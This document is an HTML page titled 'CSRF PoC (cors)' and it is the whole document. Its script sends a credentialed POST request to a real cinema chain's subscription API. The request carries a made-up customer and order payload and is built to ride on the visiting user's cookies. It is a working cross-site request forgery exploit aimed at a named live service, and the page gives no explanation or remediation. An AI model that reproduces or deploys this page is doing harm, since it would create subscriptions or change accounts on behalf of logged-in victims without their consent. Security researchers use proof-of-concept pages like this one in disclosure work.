<!doctype html>
<html>
  <body>
    <h3>CSRF PoC (cors)</h3>
    <script>
      const payload = JSON.stringify({
        commandType: "subscription",
        client: {
          id: "001Jv00000kXPraIAG",
          firstName: "test",
          lastName: "test",
          birthDate: "1996-10-01",
          mobilePhone: "+33745718646",
          homePhone: "+33745712652",
          address: "1, boulevard de Marty",
          city: "Schmittboeuf",
          postalCode: "84339",
          email: "babixo4477@vsihay.com",
          title: "Mme",
          country: "FR",
          unsubscribeLoyalty: false
        },
        order: {
          mailNotification: true,
          pushNotification: false,
          subscriptionType: "typ-abo-cp",
          addOnTypes: [],
          sendCopyToPayer: false,
          zuoraSubscriptionType: "CINEPASS"
        },
        payer: { payerDifferent: false }
      });

      fetch('https://s.pathe.fr/subscription/api/1.0.0/lead?language=en', {
         method: 'POST',
         credentials: 'include',   // <â€” request cookies be sent
         headers: { 'Content-Type': 'application/json' },
         body: payload
       })
       .then(()=>console.log('poC fired'))
       .catch(e=>console.log('fetch error', e));
    </script>
  </body>
</html>




